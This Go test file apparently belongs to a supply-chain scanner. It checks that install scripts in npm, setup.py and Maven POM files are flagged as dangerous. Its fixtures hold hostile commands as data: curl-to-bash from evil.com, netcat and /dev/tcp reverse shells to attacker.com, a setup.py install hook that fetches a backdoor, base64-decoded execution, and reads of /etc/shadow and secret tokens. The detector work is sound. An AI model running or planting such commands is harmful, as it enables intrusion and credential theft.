package analyzer

import (
	"testing"
)

func TestAnalyzeNPMScripts_NoDangerousPatterns(t *testing.T) {
	scripts := map[string]string{
		"test":  "jest",
		"build": "webpack",
		"start": "node index.js",
	}

	analysis := AnalyzeNPMScripts(scripts)

	if analysis.HasDangerousPatterns {
		t.Error("Expected no dangerous patterns for benign scripts")
	}
	if analysis.RiskLevel != "LOW" {
		t.Errorf("Expected LOW risk level, got %s", analysis.RiskLevel)
	}
	if len(analysis.DangerousPatterns) != 0 {
		t.Errorf("Expected 0 dangerous patterns, got %d", len(analysis.DangerousPatterns))
	}
}

func TestAnalyzeNPMScripts_CurlPipeBash(t *testing.T) {
	scripts := map[string]string{
		"postinstall": "curl https://evil.com/script.sh | bash",
	}

	analysis := AnalyzeNPMScripts(scripts)

	if !analysis.HasDangerousPatterns {
		t.Error("Expected dangerous patterns to be detected")
	}
	if analysis.RiskLevel != "HIGH" {
		t.Errorf("Expected HIGH risk level, got %s", analysis.RiskLevel)
	}
	if len(analysis.DangerousPatterns) == 0 {
		t.Error("Expected at least one dangerous pattern")
	}

	// Check for specific pattern
	foundCurlBash := false
	for _, p := range analysis.DangerousPatterns {
		if p.Pattern == "curl/wget | bash" {
			foundCurlBash = true
			if p.Severity != "HIGH" {
				t.Errorf("Expected HIGH severity for curl | bash, got %s", p.Severity)
			}
		}
	}
	if !foundCurlBash {
		t.Error("Expected to find 'curl/wget | bash' pattern")
	}
}

func TestAnalyzeNPMScripts_EvalUsage(t *testing.T) {
	scripts := map[string]string{
		"preinstall": "eval(require('child_process').execSync('whoami'))",
	}

	analysis := AnalyzeNPMScripts(scripts)

	if !analysis.HasDangerousPatterns {
		t.Error("Expected dangerous patterns to be detected")
	}
	if analysis.RiskLevel != "HIGH" {
		t.Errorf("Expected HIGH risk level, got %s", analysis.RiskLevel)
	}

	// Check for eval and exec patterns
	patterns := make(map[string]bool)
	for _, p := range analysis.DangerousPatterns {
		patterns[p.Pattern] = true
	}
	if !patterns["eval()"] {
		t.Error("Expected to find 'eval()' pattern")
	}
}

func TestAnalyzeNPMScripts_SensitiveEnvAccess(t *testing.T) {
	scripts := map[string]string{
		"postinstall": "echo $NPM_TOKEN && process.env.AWS_SECRET_ACCESS_KEY",
	}

	analysis := AnalyzeNPMScripts(scripts)

	if !analysis.HasDangerousPatterns {
		t.Error("Expected dangerous patterns to be detected")
	}

	foundEnvAccess := false
	for _, p := range analysis.DangerousPatterns {
		if p.Pattern == "sensitive env access" {
			foundEnvAccess = true
			if p.Severity != "HIGH" {
				t.Errorf("Expected HIGH severity, got %s", p.Severity)
			}
		}
	}
	if !foundEnvAccess {
		t.Error("Expected to find sensitive env access pattern")
	}
}

func TestAnalyzeNPMScripts_Base64Decode(t *testing.T) {
	scripts := map[string]string{
		"install": "echo 'ZXZpbCBjb2Rl' | base64 -d | sh",
	}

	analysis := AnalyzeNPMScripts(scripts)

	if !analysis.HasDangerousPatterns {
		t.Error("Expected dangerous patterns to be detected")
	}

	foundBase64 := false
	for _, p := range analysis.DangerousPatterns {
		if p.Pattern == "base64 decode" {
			foundBase64 = true
		}
	}
	if !foundBase64 {
		t.Error("Expected to find base64 decode pattern")
	}
}

func TestAnalyzeNPMScripts_HTTPDownload(t *testing.T) {
	scripts := map[string]string{
		"postinstall": "wget http://insecure.com/malware.exe",
	}

	analysis := AnalyzeNPMScripts(scripts)

	if !analysis.HasDangerousPatterns {
		t.Error("Expected dangerous patterns to be detected")
	}
	if analysis.RiskLevel != "HIGH" {
		t.Errorf("Expected HIGH risk level, got %s", analysis.RiskLevel)
	}

	// Should detect both HTTP download and executable download
	patterns := make(map[string]bool)
	for _, p := range analysis.DangerousPatterns {
		patterns[p.Pattern] = true
	}
	if !patterns["HTTP download"] && !patterns["executable download"] {
		t.Error("Expected to find HTTP or executable download pattern")
	}
}

func TestAnalyzePythonSetup_NoPatterns(t *testing.T) {
	setupContent := `
from setuptools import setup, find_packages

setup(
    name='mypackage',
    version='1.0.0',
    packages=find_packages(),
)
`

	analysis := AnalyzePythonSetup(setupContent)

	if analysis.HasDangerousPatterns {
		t.Error("Expected no dangerous patterns for benign setup.py")
	}
	if analysis.RiskLevel != "LOW" {
		t.Errorf("Expected LOW risk level, got %s", analysis.RiskLevel)
	}
}

func TestAnalyzePythonSetup_CmdClassOverride(t *testing.T) {
	setupContent := `
from setuptools import setup
from setuptools.command.install import install

class CustomInstall(install):
    def run(self):
        import os
        os.system('curl http://evil.com/backdoor.sh | sh')
        install.run(self)

setup(
    name='evil-package',
    cmdclass={'install': CustomInstall},
)
`

	analysis := AnalyzePythonSetup(setupContent)

	if !analysis.HasDangerousPatterns {
		t.Error("Expected dangerous patterns to be detected")
	}

	patterns := make(map[string]bool)
	for _, p := range analysis.DangerousPatterns {
		patterns[p.Pattern] = true
	}
	if !patterns["cmdclass override"] {
		t.Error("Expected to find cmdclass override pattern")
	}
	if !patterns["curl/wget | bash"] {
		t.Error("Expected to find curl | bash pattern")
	}
}

func TestAnalyzePythonSetup_NetworkImport(t *testing.T) {
	setupContent := `
import requests
from setuptools import setup

response = requests.get('http://evil.com/config.json')
setup(name='evil', version='1.0')
`

	analysis := AnalyzePythonSetup(setupContent)

	if !analysis.HasDangerousPatterns {
		t.Error("Expected dangerous patterns to be detected")
	}

	foundNetworkImport := false
	foundHTTPDownload := false
	for _, p := range analysis.DangerousPatterns {
		if p.Pattern == "network import" {
			foundNetworkImport = true
		}
		if p.Pattern == "HTTP download" {
			foundHTTPDownload = true
		}
	}
	if !foundNetworkImport {
		t.Error("Expected to find network import pattern")
	}
	if !foundHTTPDownload {
		t.Error("Expected to find HTTP download pattern")
	}
}

func TestAnalyzeJavaPOM_NoPlugins(t *testing.T) {
	pomContent := `
<project>
  <modelVersion>4.0.0</modelVersion>
  <groupId>com.example</groupId>
  <artifactId>myapp</artifactId>
  <version>1.0.0</version>
</project>
`

	analysis := AnalyzeJavaPOM(pomContent)

	if analysis.HasDangerousPatterns {
		t.Error("Expected no dangerous patterns for POM without plugins")
	}
	if analysis.RiskLevel != "LOW" {
		t.Errorf("Expected LOW risk level, got %s", analysis.RiskLevel)
	}
}

func TestAnalyzeJavaPOM_MavenExecPlugin(t *testing.T) {
	pomContent := `
<project>
  <build>
    <plugins>
      <plugin>
        <groupId>org.codehaus.mojo</groupId>
        <artifactId>maven-exec-plugin</artifactId>
        <executions>
          <execution>
            <phase>install</phase>
            <goals>
              <goal>exec</goal>
            </goals>
            <configuration>
              <executable>curl</executable>
              <arguments>
                <argument>http://evil.com/backdoor.sh</argument>
              </arguments>
            </configuration>
          </execution>
        </executions>
      </plugin>
    </plugins>
  </build>
</project>
`

	analysis := AnalyzeJavaPOM(pomContent)

	if !analysis.HasDangerousPatterns {
		t.Error("Expected dangerous patterns to be detected")
	}
	if analysis.RiskLevel != "HIGH" {
		t.Errorf("Expected HIGH risk level, got %s", analysis.RiskLevel)
	}

	patterns := make(map[string]bool)
	for _, p := range analysis.DangerousPatterns {
		patterns[p.Pattern] = true
	}
	if !patterns["maven-exec-plugin"] {
		t.Error("Expected to find maven-exec-plugin pattern")
	}
}

func TestAnalyzeJavaPOM_AntRunPlugin(t *testing.T) {
	pomContent := `
<project>
  <build>
    <plugins>
      <plugin>
        <artifactId>maven-antrun-plugin</artifactId>
        <executions>
          <execution>
            <phase>compile</phase>
            <goals>
              <goal>run</goal>
            </goals>
            <configuration>
              <tasks>
                <exec executable="rm">
                  <arg value="-rf"/>
                  <arg value="/tmp"/>
                </exec>
              </tasks>
            </configuration>
          </execution>
        </executions>
      </plugin>
    </plugins>
  </build>
</project>
`

	analysis := AnalyzeJavaPOM(pomContent)

	if !analysis.HasDangerousPatterns {
		t.Error("Expected dangerous patterns to be detected")
	}

	foundAntRun := false
	foundLifecycle := false
	for _, p := range analysis.DangerousPatterns {
		if p.Pattern == "maven-antrun-plugin" {
			foundAntRun = true
			if p.Severity != "HIGH" {
				t.Errorf("Expected HIGH severity, got %s", p.Severity)
			}
		}
		if p.Pattern == "lifecycle execution" {
			foundLifecycle = true
		}
	}
	if !foundAntRun {
		t.Error("Expected to find maven-antrun-plugin pattern")
	}
	if !foundLifecycle {
		t.Error("Expected to find lifecycle execution pattern")
	}
}

func TestAnalyzeJavaPOM_GroovyPlugin(t *testing.T) {
	pomContent := `
<project>
  <build>
    <plugins>
      <plugin>
        <groupId>org.codehaus.gmaven</groupId>
        <artifactId>groovy-maven-plugin</artifactId>
      </plugin>
    </plugins>
  </build>
</project>
`

	analysis := AnalyzeJavaPOM(pomContent)

	if !analysis.HasDangerousPatterns {
		t.Error("Expected dangerous patterns to be detected")
	}

	foundGroovy := false
	for _, p := range analysis.DangerousPatterns {
		if p.Pattern == "groovy-maven-plugin" {
			foundGroovy = true
			if p.Severity != "MEDIUM" {
				t.Errorf("Expected MEDIUM severity, got %s", p.Severity)
			}
		}
	}
	if !foundGroovy {
		t.Error("Expected to find groovy-maven-plugin pattern")
	}
}

func TestAnalyzeScript_Netcat(t *testing.T) {
	script := "nc -e /bin/sh attacker.com 4444"

	analysis := AnalyzeScript(script)

	if !analysis.HasDangerousPatterns {
		t.Error("Expected dangerous patterns to be detected")
	}
	if analysis.RiskLevel != "HIGH" {
		t.Errorf("Expected HIGH risk level, got %s", analysis.RiskLevel)
	}

	foundNetcat := false
	for _, p := range analysis.DangerousPatterns {
		if p.Pattern == "netcat/telnet" {
			foundNetcat = true
		}
	}
	if !foundNetcat {
		t.Error("Expected to find netcat pattern")
	}
}

func TestAnalyzeScript_DevTCP(t *testing.T) {
	script := "bash -i >& /dev/tcp/attacker.com/4444 0>&1"

	analysis := AnalyzeScript(script)

	if !analysis.HasDangerousPatterns {
		t.Error("Expected dangerous patterns to be detected")
	}

	foundDevTCP := false
	for _, p := range analysis.DangerousPatterns {
		if p.Pattern == "/dev/tcp" {
			foundDevTCP = true
			if p.Severity != "HIGH" {
				t.Errorf("Expected HIGH severity, got %s", p.Severity)
			}
		}
	}
	if !foundDevTCP {
		t.Error("Expected to find /dev/tcp pattern")
	}
}

func TestAnalyzeScript_SystemAuthFiles(t *testing.T) {
	script := "cat /etc/passwd && cat /etc/shadow"

	analysis := AnalyzeScript(script)

	if !analysis.HasDangerousPatterns {
		t.Error("Expected dangerous patterns to be detected")
	}

	foundAuthFile := false
	for _, p := range analysis.DangerousPatterns {
		if p.Pattern == "system auth file access" {
			foundAuthFile = true
		}
	}
	if !foundAuthFile {
		t.Error("Expected to find system auth file access pattern")
	}
}

func TestAnalyzeScript_ConfigDirectory(t *testing.T) {
	script := "cp sensitive-key ~/.ssh/id_rsa"

	analysis := AnalyzeScript(script)

	if !analysis.HasDangerousPatterns {
		t.Error("Expected dangerous patterns to be detected")
	}

	foundConfig := false
	for _, p := range analysis.DangerousPatterns {
		if p.Pattern == "config directory access" {
			foundConfig = true
		}
	}
	if !foundConfig {
		t.Error("Expected to find config directory access pattern")
	}
}

func TestAnalyzeScript_MultiplePatterns(t *testing.T) {
	script := `
		curl -s http://evil.com/script.sh | bash
		eval(malicious_code)
		process.env.AWS_SECRET_KEY
		rm -rf /important/data
	`

	analysis := AnalyzeScript(script)

	if !analysis.HasDangerousPatterns {
		t.Error("Expected dangerous patterns to be detected")
	}
	if analysis.RiskLevel != "HIGH" {
		t.Errorf("Expected HIGH risk level, got %s", analysis.RiskLevel)
	}
	if len(analysis.DangerousPatterns) < 3 {
		t.Errorf("Expected at least 3 dangerous patterns, got %d", len(analysis.DangerousPatterns))
	}
}
